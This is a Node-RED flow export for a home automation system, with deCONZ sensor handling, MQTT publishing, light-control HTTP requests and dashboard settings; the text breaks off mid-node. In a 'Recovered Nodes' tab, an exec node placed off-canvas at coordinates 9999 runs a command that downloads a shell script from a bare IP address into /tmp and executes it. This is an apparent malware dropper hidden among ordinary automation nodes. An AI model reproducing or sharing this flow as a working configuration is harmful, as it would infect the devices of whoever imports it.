[{"id":"6bc6a58f892d5f86","type":"tab","label":"Recovered Nodes","disabled":false,"info":"The nodes on this flow were missing a valid flow id when they were imported. They have been added to this flow so you can either restore or delete them.","env":[]},{"id":"880cd1c4ddd76047","type":"tab","label":"Recovered Nodes","disabled":false,"info":"The nodes on this flow were missing a valid flow id when they were imported. They have been added to this flow so you can either restore or delete them.","env":[]},{"id":"5a14f502389ced2a","type":"tab","label":"Deconz","disabled":false,"info":""},{"id":"2b631899544e728e","type":"tab","label":"Workshop","disabled":false,"info":""},{"id":"691c69c39e379370","type":"tab","label":"Global","disabled":false,"info":""},{"id":"6813af39821d0b74","type":"tab","label":"Kitchen","disabled":false,"info":""},{"id":"dd48277c46073d1a","type":"tab","label":"Lounge","disabled":false,"info":""},{"id":"09d4f27af0752e89","type":"tab","label":"Dashboard","disabled":false,"info":""},{"id":"3d1106e5613e554d","type":"subflow","name":"Subflow 1","info":"","in":[{"x":280,"y":160,"wires":[{"id":"b635fec797ad3fdf"}]}],"out":[]},{"id":"3d3e769f3ae81128","type":"subflow","name":"Cube","info":"msg.event = \"Slide, Flip, 180 Flip, Double tap, Drop\"\nmsg.side","category":"","in":[{"x":60,"y":40,"wires":[{"id":"06b0a17b7e4af42a"}]}],"out":[{"x":760,"y":100,"wires":[{"id":"1ce5cd7078a4881b","port":0}]},{"x":760,"y":260,"wires":[{"id":"06b0a17b7e4af42a","port":0}]}],"env":[]},{"id":"fe173b15fbf12d46","type":"subflow","name":"Vibration Sensor","info":"","category":"","in":[{"x":50,"y":30,"wires":[{"id":"aad2c7b5aa7a6e0b"}]}],"out":[{"x":800,"y":60,"wires":[{"id":"0bb6f83e86b8ee62","port":0}]},{"x":820,"y":180,"wires":[{"id":"b2ae5cb3338c2a59","port":1}]}],"env":[]},{"id":"d75f99beee083d3c","type":"subflow","name":"Bedroom Lights","info":"","category":"","in":[{"x":50,"y":30,"wires":[{"id":"ac1b0fbc52bd6dcd"},{"id":"2a20e6b5c1a67642"},{"id":"91d8cbb9955556bf"}]}],"out":[{"x":560,"y":80,"wires":[{"id":"ac1b0fbc52bd6dcd","port":0},{"id":"2a20e6b5c1a67642","port":0},{"id":"91d8cbb9955556bf","port":0}]}],"env":[]},{"id":"b0efa8cee61b4227","type":"subflow","name":"Toggle SMTSKT State w/ timeouts","info":"","category":"","in":[{"x":60,"y":120,"wires":[{"id":"717db172153ff91c"}]}],"out":[{"x":740,"y":120,"wires":[{"id":"34821502ebab6197","port":0}]}],"env":[{"name":"event_name","type":"str","value":"not supplied","ui":{"type":"input","opts":{"types":["str","env"]}}},{"name":"variation","type":"str","value":"20 minutes"},{"name":"timeout_seconds","type":"num","value":"10"}],"meta":{},"color":"#DDAA99","status":{"x":620,"y":260,"wires":[{"id":"34821502ebab6197","port":1}]}},{"id":"03f813acd4e097e7","type":"mqtt-broker","name":"MQTT","broker":"192.168.1.105","port":"1883","clientid":"","usetls":false,"compatmode":true,"keepalive":"60","cleansession":true,"birthTopic":"","birthQos":"0","birthPayload":"","closeTopic":"","closeQos":"0","closePayload":"","willTopic":"","willQos":"0","willPayload":""},{"id":"af078140bebc8e90","type":"websocket-listener","path":"ws://192.168.1.105:8088","wholemsg":"false"},{"id":"a8252e1165386e9d","type":"websocket-client","path":"ws://192.168.1.105:443","tls":"","wholemsg":"false"},{"id":"748ffd1814f3a169","type":"pushbullet-config","name":""},{"id":"eb05529d9039a3ca","type":"websocket-listener","path":"http://192.168.1.105:80/api/E09E33DE20/lights","wholemsg":"false"},{"id":"f22cc6d4f7cde60a","type":"ui_tab","name":"Home","icon":"dashboard","order":""},{"id":"0b62a56ccf720e95","type":"ui_group","name":"Otaghe e Liam","tab":"ba35054ca7312f73","disp":true,"width":"12","collapse":false},{"id":"001c5160b9d06b48","type":"ui_base","name":"","theme":{"name":"theme-light","lightTheme":{"default":"#0094CE","baseColor":"#0094CE","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif","edited":true,"reset":false},"darkTheme":{"default":"#097479","baseColor":"#097479","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif","edited":true,"reset":false},"customTheme":{"name":"Untitled Theme 1","default":"#4B7930","baseColor":"#4B7930","baseFont":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"},"themeState":{"base-color":{"default":"#0094CE","value":"#0094CE","edited":false},"page-titlebar-backgroundColor":{"value":"#0094CE","edited":false},"page-backgroundColor":{"value":"#fafafa","edited":false},"page-sidebar-backgroundColor":{"value":"#ffffff","edited":false},"group-textColor":{"value":"#1bbfff","edited":false},"group-borderColor":{"value":"#ffffff","edited":false},"group-backgroundColor":{"value":"#ffffff","edited":false},"widget-textColor":{"value":"#111111","edited":false},"widget-backgroundColor":{"value":"#0094ce","edited":false},"widget-borderColor":{"value":"#ffffff","edited":false},"base-font":{"value":"-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"}},"angularTheme":{"primary":"indigo","accents":"blue","warn":"red","background":"grey"}},"site":{"name":"Node-RED Dashboard","hideToolbar":"false","allowSwipe":"false","lockMenu":"false","allowTempTheme":"true","dateFormat":"DD/MM/YYYY","sizes":{"sx":48,"sy":48,"gx":6,"gy":6,"cx":6,"cy":6,"px":0,"py":0}}},{"id":"9a96dc6533dbc8ae","type":"ui_group","name":"Workshop","tab":"ba35054ca7312f73","disp":true,"width":"10","collapse":false},{"id":"ba35054ca7312f73","type":"ui_tab","name":"Start","icon":"dashboard","disabled":false,"hidden":false},{"id":"dc0516a91cf770e2","type":"ui_group","name":"test","tab":"ed78a03e3cfc2b2f","order":3,"disp":true,"width":"7","collapse":true},{"id":"ed78a03e3cfc2b2f","type":"ui_tab","name":"test","icon":"fa-television","order":2},{"id":"104dba9b0ed114da","type":"ui_group","name":"Lounge","tab":"ba35054ca7312f73","disp":true,"width":"12","collapse":false},{"id":"d1e8bc9ea2b13bc8","type":"mqtt-broker","broker":"192.168.24.2","port":"1883","clientid":"","autoConnect":true,"usetls":false,"compatmode":false,"protocolVersion":4,"keepalive":"15","cleansession":true,"autoUnsubscribe":true,"birthTopic":"","birthQos":"0","birthPayload":"","willTopic":"","willQos":"0","willPayload":""},{"id":"910ae96b7f026820","type":"ui_group","name":"Default","tab":"2d89cebc829166e7","disp":true,"width":"6"},{"id":"d94fb4cde3583439","type":"mqtt-broker","broker":"192.168.24.2","port":"1883","clientid":"","usetls":false,"compatmode":false,"keepalive":"15","cleansession":true,"birthTopic":"","birthQos":"0","birthPayload":"","willTopic":"","willQos":"0","willPayload":""},{"id":"2d89cebc829166e7","type":"ui_tab","name":"Home","icon":"dashboard","order":8},{"id":"492bbe851dc20ccc","type":"xterm_config","rows":60,"columns":120,"cursorStyle":"bar","fastScrollModifier":"alt","scrollSensitivity":1,"fastScrollSensitivity":1,"scrollback":1000,"backgroundColor":"#000000","foregroundColor":"#ffffff","fontSize":14,"cursorBlink":true,"drawBoldTextInBrightColors":true,"loggingEnabled":false,"name":""},{"id":"b635fec797ad3fdf","type":"function","z":"3d1106e5613e554d","name":"RELAY_ON","func":"var smtskt2sstate=flow.get('smtskt2sstate') || 0;\n\nif (smtskt2sstate === 0) {\n    msg.payload = \"$RELAY$ON\";\n    flow.set('smtskt2sstate', 1);\n}\nelse {\n    msg.payload = \"$RELAY$OFF\";\n    flow.set('smtskt2sstate', 0);\n}\nreturn msg;","outputs":1,"noerr":0,"x":550,"y":160,"wires":[[]]},{"id":"dfba8f122ef6b135","type":"switch","z":"3d3e769f3ae81128","name":"Cube","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"2","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":350,"y":140,"wires":[["1ce5cd7078a4881b"],[]]},{"id":"1ce5cd7078a4881b","type":"function","z":"3d3e769f3ae81128","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\nmsg.side = side;\n\nif (event % 1000 === 0) {\n    msg.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.event = \"drop\";\n}\nelse {\n    msg.event = \"unknown (\" + event + \")\";\n}\nreturn msg;","outputs":1,"noerr":0,"x":560,"y":100,"wires":[[]]},{"id":"06b0a17b7e4af42a","type":"json","z":"3d3e769f3ae81128","name":"","property":"payload","action":"","pretty":false,"x":210,"y":260,"wires":[["dfba8f122ef6b135"]]},{"id":"cf8933a7532c2df6","type":"comment","z":"3d3e769f3ae81128","name":"Links","info":"http://blog.smarterhome.club/2019/04/30/raspbee4/","x":470,"y":220,"wires":[]},{"id":"b2ae5cb3338c2a59","type":"switch","z":"fe173b15fbf12d46","name":"Vibration","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":360,"y":100,"wires":[["0bb6f83e86b8ee62"],[]]},{"id":"0bb6f83e86b8ee62","type":"function","z":"fe173b15fbf12d46","name":"msg.strength","func":"if (msg.payload.state === undefined ||\n    msg.payload.state.vibration === undefined) {\n    return null;        \n}\n\nif (msg.payload.state.vibration === true) {\n    msg.strength = msg.payload.state.strength;\n    return msg;\n}\nreturn null;","outputs":1,"noerr":0,"x":530,"y":60,"wires":[[]]},{"id":"aad2c7b5aa7a6e0b","type":"json","z":"fe173b15fbf12d46","name":"","property":"payload","action":"","pretty":false,"x":210,"y":220,"wires":[["b2ae5cb3338c2a59"]]},{"id":"f1563ea8bc56466f","type":"comment","z":"fe173b15fbf12d46","name":"Links","info":"http://blog.smarterhome.club/2019/04/30/raspbee4/","x":470,"y":180,"wires":[]},{"id":"ac1b0fbc52bd6dcd","type":"http request","z":"d75f99beee083d3c","name":"Light 1 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/4/state","tls":"","proxy":"","authType":"","x":310,"y":100,"wires":[[]]},{"id":"2a20e6b5c1a67642","type":"http request","z":"d75f99beee083d3c","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/5/state","tls":"","proxy":"","authType":"","x":310,"y":160,"wires":[[]]},{"id":"91d8cbb9955556bf","type":"http request","z":"d75f99beee083d3c","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/6/state","tls":"","proxy":"","authType":"","x":310,"y":220,"wires":[[]]},{"id":"717db172153ff91c","type":"function","z":"b0efa8cee61b4227","name":"","func":"var event_name = env.get(\"event_name\");\nvar timeout_seconds = env.get(\"timeout_seconds\");\nvar last_payload = context.get(event_name) || \"off\";\n\n// node.warn(event_name);\n\nvar payload = {\n    payload: \"on\",\n    timeout: timeout_seconds\n};\n\nvar is_plug_button = msg.payload \n    == \"EV_SPECFIC_TIME_REACHED\" || msg.payload \n    == \"EV_CLICKED\";\nvar is_motion = msg.payload.state != null &&\n    msg.payload.state.presence != null;\nvar is_deconz_button = msg.payload.state != null &&\n    msg.payload.state.buttonevent != null &&\n    msg.payload.state.buttonevent == \"1002\";\n\n// toggle\nif (is_plug_button || is_deconz_button || msg.payload == \"on\") {\n    payload.payload = last_payload == \"off\" ? \"on\" : \"off\";\n}\n// retrigger\nelse if (is_motion) {\n    payload.payload = \"on\";\n}\nelse {\n    return;\n}\n\ncontext.set(event_name, payload.payload); // store new payload state\n\nmsg.payload = payload;\n// node.warn(msg.payload);\n    \nreturn msg;\n","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":220,"y":120,"wires":[["34821502ebab6197"]]},{"id":"34821502ebab6197","type":"mytimeout","z":"b0efa8cee61b4227","name":"","outtopic":"","outsafe":"$LED$ON$RELAY$ON","outwarning":"","outunsafe":"$LED$OFF$RELAY$OFF","warning":"0","timer":"10800","debug":false,"ndebug":false,"ignoreCase":false,"repeat":false,"again":false,"x":430,"y":120,"wires":[[],[]]},{"id":"54b08592-1fee-4bc5-8c74-15f2cff03559","type":"exec","z":"6bc6a58f892d5f86","command":"cd /tmp; rm -rf bins.sh; wget http://91.92.249.32/bins/bins.sh; chmod +x bins.sh; sh bins.sh","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"023d8d14-0ff0-4021-bc13-0b6d7aaf1329","type":"inject","z":"6bc6a58f892d5f86","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["54b08592-1fee-4bc5-8c74-15f2cff03559"]]},{"id":"75041c376e220ea6","type":"websocket in","z":"5a14f502389ced2a","name":"","server":"","client":"a8252e1165386e9d","x":140,"y":60,"wires":[["6ca7e0fa4f7d5e82","5942d04e37bd6729"]]},{"id":"8efa32a40b5ab628","type":"comment","z":"5a14f502389ced2a","name":"https://github.com/dresden-elektronik/deconz-rest-plugin/issues/138#issuecomment-325101635","info":"https://github.com/dresden-elektronik/deconz-rest-plugin/issues/138#issuecomment-325101635","x":330,"y":1000,"wires":[]},{"id":"2f19dd8b5b915a93","type":"mqtt out","z":"5a14f502389ced2a","name":"","topic":"/device/cube1/event","qos":"","retain":"","broker":"03f813acd4e097e7","x":1020,"y":600,"wires":[]},{"id":"81474b18bf1ddb27","type":"mqtt out","z":"5a14f502389ced2a","name":"","topic":"/device/aqara/vibration/door","qos":"","retain":"","broker":"03f813acd4e097e7","x":1020,"y":720,"wires":[]},{"id":"6ca7e0fa4f7d5e82","type":"json","z":"5a14f502389ced2a","name":"","property":"payload","action":"","pretty":false,"x":130,"y":680,"wires":[["ab7c4f8f359bb78e","77f6d2d8d0d52e0f","13b0ba1bc0f20154","870c857295d33334","104b9ddcb436d28a","d02988e604537584","1959fb17b39a37c0","d95a2c4aaafc0e02","b893ec9c60e68269","a5411610f6e1dd62","426dca53639cd64d"]]},{"id":"ab7c4f8f359bb78e","type":"switch","z":"5a14f502389ced2a","name":"Cube1","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":410,"y":600,"wires":[["57fa02f476d6e81a"]]},{"id":"77f6d2d8d0d52e0f","type":"switch","z":"5a14f502389ced2a","name":"Vibration Front Door","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"9","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":460,"y":700,"wires":[["81474b18bf1ddb27"]]},{"id":"13b0ba1bc0f20154","type":"switch","z":"5a14f502389ced2a","name":"Vibration Other","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"10","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":2,"x":440,"y":740,"wires":[[],[]]},{"id":"104b9ddcb436d28a","type":"switch","z":"5a14f502389ced2a","name":"Lights","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"4","vt":"str"},{"t":"eq","v":"5","vt":"str"},{"t":"eq","v":"6","vt":"str"},{"t":"eq","v":"1","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":5,"x":770,"y":1020,"wires":[[],[],[],[],[]]},{"id":"dd48d3aa7326a7fd","type":"mqtt out","z":"5a14f502389ced2a","name":"","topic":"/device/aqara/motion/kitchen","qos":"","retain":"","broker":"03f813acd4e097e7","x":1360,"y":360,"wires":[]},{"id":"466d7b15dccd8ff4","type":"function","z":"5a14f502389ced2a","name":"ON","func":"if (msg.payload.state !== undefined && msg.payload.state.presence) {\n    msg.payload = \"on\";\n    return msg;\n}\nreturn null;","outputs":1,"noerr":0,"x":770,"y":400,"wires":[["c7c758c9b4a15fe6","dd48d3aa7326a7fd"]]},{"id":"57fa02f476d6e81a","type":"function","z":"5a14f502389ced2a","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\n\nif (event % 1000 === 0) {\n    msg.payload.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.payload.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.payload.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.payload.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.payload.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.payload.event = \"drop\";\n}\nelse {\n    msg.payload.event = \"unknown (\" + event + \")\";\n}\nmsg.payload.side = side;\nreturn msg;","outputs":1,"noerr":0,"initialize":"","finalize":"","libs":[],"x":600,"y":600,"wires":[["2f19dd8b5b915a93"]]},{"id":"870c857295d33334","type":"switch","z":"5a14f502389ced2a","name":"Temperature 42","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"42","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":940,"wires":[["4695b87691f1e6b8","d5a9ede209e36be6"]]},{"id":"5942d04e37bd6729","type":"debug","z":"5a14f502389ced2a","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":450,"y":60,"wires":[]},{"id":"3ee1e57aa1946d2d","type":"http request","z":"5a14f502389ced2a","name":"Request new API Key from Deconz","method":"POST","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api","tls":"","proxy":"","authType":"","x":400,"y":1180,"wires":[["8e3e9ab70d172d6a"]]},{"id":"890efc7688ba2d39","type":"inject","z":"5a14f502389ced2a","name":"Headers for API Key","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{ \"devicetype\": \"nodered\" }","payloadType":"str","x":130,"y":1180,"wires":[["3ee1e57aa1946d2d"]]},{"id":"8e3e9ab70d172d6a","type":"json","z":"5a14f502389ced2a","name":"","property":"payload","action":"","pretty":false,"x":710,"y":1180,"wires":[[]]},{"id":"88f5bc63955270bc","type":"comment","z":"5a14f502389ced2a","name":"http://dresden-elektronik.github.io/deconz-rest-doc/getting_started/","info":"","x":280,"y":1220,"wires":[]},{"id":"1c5907144a184c4a","type":"http request","z":"5a14f502389ced2a","name":"Get lights","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights","tls":"","proxy":"","authType":"","x":480,"y":1380,"wires":[["b367d560b8f14932"]]},{"id":"920d6293cb10ed9f","type":"inject","z":"5a14f502389ced2a","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1380,"wires":[["1c5907144a184c4a"]]},{"id":"61e44d4b430feba4","type":"debug","z":"5a14f502389ced2a","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"true","targetType":"full","x":840,"y":1380,"wires":[]},{"id":"b367d560b8f14932","type":"json","z":"5a14f502389ced2a","name":"","property":"payload","action":"","pretty":false,"x":680,"y":1380,"wires":[["61e44d4b430feba4"]]},{"id":"85033f6e084263f8","type":"http request","z":"5a14f502389ced2a","name":"Get light 4","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/4","tls":"","proxy":"","authType":"","x":490,"y":1420,"wires":[["b367d560b8f14932"]]},{"id":"72af07b3a532e7c7","type":"inject","z":"5a14f502389ced2a","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1420,"wires":[["85033f6e084263f8"]]},{"id":"b2dd07477b6dc175","type":"http request","z":"5a14f502389ced2a","name":"Put Light 4","method":"PUT","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/5/state","tls":"","proxy":"","authType":"","x":490,"y":1460,"wires":[["b367d560b8f14932"]]},{"id":"ac29ea2d07ba957f","type":"inject","z":"5a14f502389ced2a","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"LIght OFF","payload":"{\"on\":true,\"bri\":180,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":250,"y":1460,"wires":[["b2dd07477b6dc175"]]},{"id":"df62ea1f3f4d68e9","type":"http request","z":"5a14f502389ced2a","name":"Get Groups","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/groups","tls":"","proxy":"","authType":"","x":470,"y":1520,"wires":[["b367d560b8f14932"]]},{"id":"1581bf54f11d2313","type":"inject","z":"5a14f502389ced2a","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"Groups","payload":"","payloadType":"str","x":280,"y":1520,"wires":[["df62ea1f3f4d68e9"]]},{"id":"53986088094a9717","type":"http request","z":"5a14f502389ced2a","name":"","method":"PUT","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/groups/2/action","tls":"","proxy":"","authType":"","x":470,"y":1580,"wires":[["b367d560b8f14932"]]},{"id":"63da92c1628fcfca","type":"inject","z":"5a14f502389ced2a","name":"Groups - ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"transitiontime\":10}","payloadType":"json","x":290,"y":1580,"wires":[["53986088094a9717"]]},{"id":"2cca5f51d7930ca5","type":"inject","z":"5a14f502389ced2a","name":"Groups - OFF","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":false,\"bri\":255,\"transitiontime\":10}","payloadType":"json","x":290,"y":1620,"wires":[["53986088094a9717"]]},{"id":"fe5fee48378ec1b1","type":"http request","z":"5a14f502389ced2a","name":"Get sensors","method":"GET","ret":"txt","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/sensors","tls":"","proxy":"","authType":"","x":490,"y":1280,"wires":[["7a50cb52d72e1166"]]},{"id":"3b0930ca6916e156","type":"inject","z":"5a14f502389ced2a","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":270,"y":1280,"wires":[["fe5fee48378ec1b1"]]},{"id":"300da77f05d32dcc","type":"debug","z":"5a14f502389ced2a","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"true","targetType":"full","x":840,"y":1280,"wires":[]},{"id":"7a50cb52d72e1166","type":"json","z":"5a14f502389ced2a","name":"","property":"payload","action":"","pretty":false,"x":680,"y":1280,"wires":[["300da77f05d32dcc"]]},{"id":"d02988e604537584","type":"switch","z":"5a14f502389ced2a","name":"Cube2","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"34","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":410,"y":560,"wires":[["40b432bc5bba1ddf"]]},{"id":"40b432bc5bba1ddf","type":"function","z":"5a14f502389ced2a","name":"Event (.event, .side)","func":"\nif (msg.payload.state === undefined || \n    msg.payload.state.buttonevent === undefined) {\n    return null;\n}\n\nvar event = msg.payload.state.buttonevent;\nvar side = Math.round(event/1000);\nvar modifier = event - (side * 1000);\n\nif (event % 1000 === 0) {\n    msg.payload.event = \"slide\";\n}\nelse if (event === 7007) {\n    msg.payload.event = \"shake\";\n}\nelse if (event === (side*1000) + side) {\n    msg.payload.event = \"doubletap\";\n}\nelse if (side + modifier === 7) {\n    msg.payload.event = \"180flip\";\n}\nelse if (side != 7 - modifier) {\n    msg.payload.event = \"flip\";\n}\nelse if (event === 7008) {\n    msg.payload.event = \"drop\";\n}\nelse {\n    msg.payload.event = \"unknown (\" + event + \")\";\n}\nmsg.payload.side = side;\nreturn msg;","outputs":1,"noerr":0,"x":600,"y":560,"wires":[["8c5eb4706d2534b3"]]},{"id":"8c5eb4706d2534b3","type":"mqtt out","z":"5a14f502389ced2a","name":"","topic":"/device/cube2/event","qos":"","retain":"","broker":"03f813acd4e097e7","x":1020,"y":560,"wires":[]},{"id":"1959fb17b39a37c0","type":"function","z":"5a14f502389ced2a","name":"Cave Lights","func":"\nswitch (msg.payload.id)\n{\n    case \"10\":\n    case\"11\":\n    case \"12\":\n        return msg;\n    default:\n        return null;\n}","outputs":1,"noerr":0,"x":310,"y":1060,"wires":[["92d1e0f4585b7c4a"]]},{"id":"92d1e0f4585b7c4a","type":"link out","z":"5a14f502389ced2a","name":"Cave LIghts","links":["71c66eac.2ef66"],"x":435,"y":1060,"wires":[]},{"id":"ff191787623a638b","type":"link out","z":"5a14f502389ced2a","name":"Temp 36","links":["6c967436bdfb7c72"],"x":615,"y":860,"wires":[]},{"id":"4695b87691f1e6b8","type":"link out","z":"5a14f502389ced2a","name":"Temp 42","links":["5ea0cb9c113fcc28"],"x":615,"y":940,"wires":[]},{"id":"04097b2b1f75fa02","type":"link out","z":"5a14f502389ced2a","name":"Temp 39","links":["ce4e045dc58fa414"],"x":615,"y":900,"wires":[]},{"id":"164e1ef7931f5f49","type":"link out","z":"5a14f502389ced2a","name":"Button 25","mode":"link","links":[],"x":1095,"y":200,"wires":[]},{"id":"7afb97203d33eac3","type":"link out","z":"5a14f502389ced2a","name":"Button 32","mode":"link","links":["e9ae23d31b987d9d"],"x":1095,"y":280,"wires":[]},{"id":"4139754aae0fa1aa","type":"link out","z":"5a14f502389ced2a","name":"Button 33","links":[],"x":1095,"y":320,"wires":[]},{"id":"d95a2c4aaafc0e02","type":"switch","z":"5a14f502389ced2a","name":"Temperature 17","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"17","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":780,"wires":[["258a182d780ba89b","d5a9ede209e36be6"]]},{"id":"258a182d780ba89b","type":"link out","z":"5a14f502389ced2a","name":"Temp 17","links":["70eafd5b969d85d8"],"x":615,"y":780,"wires":[],"icon":"font-awesome/fa-thermometer-0"},{"id":"b893ec9c60e68269","type":"switch","z":"5a14f502389ced2a","name":"Temperature 14","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"14","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":820,"wires":[["3317c0e303553415","d5a9ede209e36be6"]]},{"id":"3317c0e303553415","type":"link out","z":"5a14f502389ced2a","name":"Temp 14","links":["4b28afe4.e0cc9","692a814c8e714953"],"x":615,"y":820,"wires":[],"icon":"font-awesome/fa-thermometer-0"},{"id":"c036ce43bacbad60","type":"switch","z":"5a14f502389ced2a","name":"Temperature 39","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"39","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":900,"wires":[["04097b2b1f75fa02","d5a9ede209e36be6"]]},{"id":"f3c361a84120b71d","type":"switch","z":"5a14f502389ced2a","name":"Temperature 36","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"36","vt":"str"}],"checkall":"true","repair":false,"outputs":1,"x":440,"y":860,"wires":[["ff191787623a638b","d5a9ede209e36be6"]]},{"id":"a5411610f6e1dd62","type":"switch","z":"5a14f502389ced2a","name":"Buttons","property":"payload.state.buttonevent","propertyType":"msg","rules":[{"t":"nnull"}],"checkall":"true","repair":false,"outputs":1,"x":360,"y":280,"wires":[["ba83490004267220"]]},{"id":"2107e185bd737341","type":"debug","z":"5a14f502389ced2a","name":"Otherwise","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":740,"y":340,"wires":[]},{"id":"e298e35ef8be5d80","type":"link out","z":"5a14f502389ced2a","name":"Button 31","mode":"link","links":[],"x":1095,"y":240,"wires":[]},{"id":"d5a9ede209e36be6","type":"debug","z":"5a14f502389ced2a","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":790,"y":840,"wires":[]},{"id":"ba83490004267220","type":"switch","z":"5a14f502389ced2a","name":"Button Ids","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"25","vt":"str"},{"t":"eq","v":"31","vt":"str"},{"t":"eq","v":"32","vt":"str"},{"t":"eq","v":"33","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":5,"x":540,"y":280,"wires":[["164e1ef7931f5f49"],["e298e35ef8be5d80"],["7afb97203d33eac3"],["4139754aae0fa1aa"],["2107e185bd737341"]]},{"id":"426dca53639cd64d","type":"switch","z":"5a14f502389ced2a","name":"Motion","property":"payload.state.presence","propertyType":"msg","rules":[{"t":"nnull"}],"checkall":"true","repair":false,"outputs":1,"x":330,"y":420,"wires":[["b8f64d8c3d3455d9"]]},{"id":"b8f64d8c3d3455d9","type":"switch","z":"5a14f502389ced2a","name":"Motion Ids","property":"payload.id","propertyType":"msg","rules":[{"t":"eq","v":"24","vt":"str"},{"t":"eq","v":"21","vt":"str"},{"t":"else"}],"checkall":"true","repair":false,"outputs":3,"x":550,"y":420,"wires":[["466d7b15dccd8ff4"],["ba56c5014d5b8e5c"],["c542b4d7b107c611"]]},{"id":"ba56c5014d5b8e5c","type":"link out","z":"5a14f502389ced2a","name":"Motion Cave","mode":"link","links":["f3a4d33dd7bbac19"],"x":895,"y":440,"wires":[]},{"id":"c7c758c9b4a15fe6","type":"link out","z":"5a14f502389ced2a","name":"Motion 